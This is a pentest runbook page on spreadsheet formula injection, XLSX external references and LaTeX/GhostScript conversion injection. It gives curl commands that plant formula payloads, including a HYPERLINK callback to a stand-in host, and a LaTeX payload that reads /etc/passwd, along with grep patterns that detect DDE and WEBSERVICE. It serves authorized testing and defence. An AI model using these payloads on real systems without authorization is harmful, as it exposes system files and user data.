---
title: "Formula / CSV / Doc / LaTeX / GhostScript Injection"
description: "Spreadsheet formula injection, XLSX external references, and command execution via LaTeX, GhostScript, and OOXML document handling."
phase: Web
order: 34
tags:
  - csv-injection
  - document-conversion
  - latex
  - ooxml
tools:
  - burp suite
  - libreoffice
updated: 2026-10-01
---

A document/spreadsheet injection runbook for authorized pentests / bug bounty on **in-scope** targets only. Goal: find export and conversion features that silently execute formulas or commands, and prove it with an inert callback.

## 1. Find export and conversion features

```bash
# Endpoints that emit CSV/XLSX/PDF/DOC
ffuf -u "https://target.com/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200 -t 30 | grep -iE "export|report|download|csv|xlsx|pdf|convert"
```

## 2. Test CSV / spreadsheet formula injection

Input that starts with `=`, `+`, `-`, or `@` is treated as a formula by Excel/LibreOffice.

```bash
# Store a formula in a field, then request the export
curl -s -b "session=YOURTOKEN" -X POST "https://target.com/profile" \
  --data-urlencode "name==2+5"

curl -s -b "session=YOURTOKEN" "https://target.com/export.csv" -o out.csv
grep -n "=2+5" out.csv

# Callback formula (Excel: WEBSERVICE / HYPERLINK; DDE variants)
curl -s -b "session=YOURTOKEN" -X POST "https://target.com/profile" \
  --data-urlencode 'name==HYPERLINK("https://oob.example/cb","click")'
curl -s -b "session=YOURTOKEN" "https://target.com/export.csv" | grep -i oob.example
```

## 3. Inspect the generated file

```bash
# Check for injection characters that survived sanitization
grep -nE "^[=+\-@]" out.csv

# Detect the real format and content-type
file out.csv
curl -s -D - -o /dev/null "https://target.com/export.xlsx" | grep -i "content-type\|content-disposition"

# Unzip the OOXML and inspect shared strings / relationships for external refs
mkdir -p xlsx && unzip -o export.xlsx -d xlsx && ls xlsx/xl
grep -rioE "https?://[^\"<]+" xlsx/xl 2>/dev/null | head
```

## 4. External references and XML injection in XLSX

```bash
# After unzipping, check relationships for external targets
cat xlsx/xl/_rels/workbook.xml.rels 2>/dev/null | grep -i external
grep -rioE "DDE|WEBSERVICE|EXEC" xlsx/xl 2>/dev/null
```

## 5. LaTeX / GhostScript conversion

If a PDF or report service compiles LaTeX or shells out to GhostScript, test for command primitives.

```bash
# LaTeX: try to escape a text field into a command
curl -s -b "session=YOURTOKEN" -X POST "https://target.com/report" \
  --data-urlencode 'title=\input{/etc/passwd}'
curl -s -b "session=YOURTOKEN" "https://target.com/report.pdf" -o report.pdf
python3 -c "import sys; print(open('report.pdf','rb').read()[:50])"

# GhostScript: crafted PostScript for a callback (authorized only)
# Confirm the service version first
curl -s "https://target.com/tools/version" | grep -i ghostscript
```

## 6. Verify sanitization gaps with LibreOffice

```bash
# Reproduce the export locally and see whether the formula survives
libreoffice --headless --convert-to csv out.xlsx --outdir check
grep -nE "^[=+\-@]" check/out.csv

# Test matrix of payload prefixes
for p in '=' '+' '-' '@' ' =' $'\t='; do
  echo "payload: $p"
done
```

## Full pipeline

```bash
# 1. Find export endpoints
ffuf -u "https://target.com/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -t 30 | grep -iE "export|report|download|convert"

# 2. Store a formula and export
curl -s -b "session=YOURTOKEN" -X POST "https://target.com/profile" --data-urlencode "name==2+5"
curl -s -b "session=YOURTOKEN" "https://target.com/export.csv" -o out.csv
grep -nE "^[=+\-@]" out.csv

# 3. Callback formula
curl -s -b "session=YOURTOKEN" -X POST "https://target.com/profile" --data-urlencode 'name==HYPERLINK("https://oob.example/cb","click")'
curl -s -b "session=YOURTOKEN" "https://target.com/export.csv" | grep -i oob.example

# 4. OOXML external reference inspection
mkdir -p xlsx && unzip -o export.xlsx -d xlsx && grep -rioE "https?://[^\"<]+" xlsx/xl | head

# 5. Conversion injection
curl -s -b "session=YOURTOKEN" -X POST "https://target.com/report" --data-urlencode 'title=\input{/etc/passwd}'

# 6. Local sanitization check
libreoffice --headless --convert-to csv out.xlsx --outdir check && grep -nE "^[=+\-@]" check/out.csv
```

## Ethics & legality

- Only test export/conversion features within the authorized scope and with your own account.
- Use inert markers (`2+5`, a callback URL) — never DDE/command payloads that alter the host.
- Do not send generated documents to third parties; inspect them locally.
- Keep the input payload, generated file, and formula evidence for the report.
